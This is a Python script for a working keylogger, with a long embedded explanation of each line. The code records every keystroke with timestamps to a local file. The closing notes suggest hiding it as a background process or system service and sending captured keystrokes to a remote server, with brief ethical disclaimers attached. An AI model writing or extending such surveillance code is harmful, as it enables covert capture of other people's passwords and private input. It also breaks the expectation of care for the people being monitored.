#!/bin/python3


'''
Here is a modified version that writes captured keystrokes to a 
log file and handles more complex scenarios.
'''

from pynput.keyboard import Listener, Key
import logging

# Set up logging to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        # Write the key pressed to the log file
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        # Log special keys
        logging.info(f"Special key {key} pressed")

def on_release(key):
    # Stop listener if 'esc' key is pressed
    if key == Key.esc:
        return False

# Collecting keystrokes and logging to file
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

'''
    from pynput.keyboard import Listener, Key:
        Listener: This is the main class from pynput that listens for keyboard events such as key presses and key releases.
        Key: This module provides special keys (like esc, enter, shift, etc.) that are not part of the typical ASCII key set. Special keys require different handling than normal characters (letters, numbers).

    import logging:
        The logging module is part of Python's standard library and is used to log messages to various outputs (in this case, to a file). We use this to store the captured keystrokes.
logging.basicConfig(): This function sets up basic configuration for logging.

    filename="keylog.txt": Specifies that the log will be saved to a file named keylog.txt.
    level=logging.DEBUG: Sets the logging level to DEBUG, which means it will log all levels of messages (debug, info, warning, error, and critical).
    format="%(asctime)s - %(message)s": Defines the format of the log entries. %(asctime)s inserts a timestamp, and %(message)s represents the actual log message (which, in this case, will be the key presses).
def on_press(key):: This function is triggered whenever a key is pressed. The key argument represents the key that was pressed.

try:: We attempt to print the character of the key.

    key.char: If the key is a regular key (like a letter or number), key.char will contain the character corresponding to the key pressed (e.g., 'a', '1', etc.). We log that key press to the file.

except AttributeError:: If the key pressed is a special key (like space, shift, enter, or esc), then key.char will not exist (it throws an AttributeError). In this case, the except block catches the error and logs the key as a special key.

    logging.info(f"Special key {key} pressed"): This logs the special key (e.g., Key.space, Key.shift, etc.).
def on_release(key):: This function is triggered whenever a key is released.

if key == Key.esc:: This checks if the Esc key is the one being released.

    return False: If the Esc key is released, the listener will stop. This is how we provide a way to terminate the keylogger manually. The listener will stop and exit the program when the Esc key is pressed.
    with Listener(on_press=on_press, on_release=on_release) as listener::
        This sets up the Listener to monitor the keyboard. We pass the on_press and on_release functions as arguments so that the listener knows which functions to call when a key is pressed or released.
        Listener will continuously run in the background and call the appropriate function (on_press or on_release) whenever a key is interacted with.
    listener.join():
        This starts the listener and keeps the script running. It ensures that the program doesn’t exit immediately and continues to listen for keystrokes. The join() method is necessary to block the main thread until the listener finishes (which will only happen when the Esc key is pressed).

How It Works:

    The program begins by setting up the logging system to save keystrokes to a file (keylog.txt).
    Whenever a key is pressed, the on_press() function is called, logging either a regular key or a special key.
    When a key is released, the on_release() function is called. If the Esc key is released, the listener will stop, effectively terminating the keylogger.
    The Listener runs in a loop and continuously monitors for keystrokes until the user presses the Esc key.

Limitations and Improvements:

    Logging in Plaintext:
        Currently, the keystrokes are logged in plain text. This can be a security risk. To enhance it, you could encrypt the log data to ensure that sensitive information isn't exposed if the log file is accessed by unauthorized users.

    Logging Special Keys:
        Special keys like Shift, Ctrl, and Alt are logged as Key.shift, Key.ctrl, etc. This works fine but could be further refined to capture multiple key combinations (like pressing Ctrl+C).

    Logging in Background:
        The current script needs to run in a terminal window. To make it more stealthy, you could run it in the background, or configure it to run as a system service (for educational purposes, of course).

    Handling Large Log Files:
        If the keylogger runs for a long time, the log file could grow large. Implementing log rotation (where older logs are archived, and new logs are written to a new file) would help prevent the file from becoming too large.

    Transmission of Data:
        Instead of writing to a local file, you could modify the code to transmit the captured keystrokes to a remote server over the network. However, this would be a violation of privacy and should only be used in ethical hacking scenarios.

Ethical and Legal Considerations:

    Permission: You must have explicit permission to monitor any device or system using this code. Using a keylogger without permission is illegal and unethical.
    Privacy Concerns: Always respect privacy and avoid using this for malicious purposes.
'''


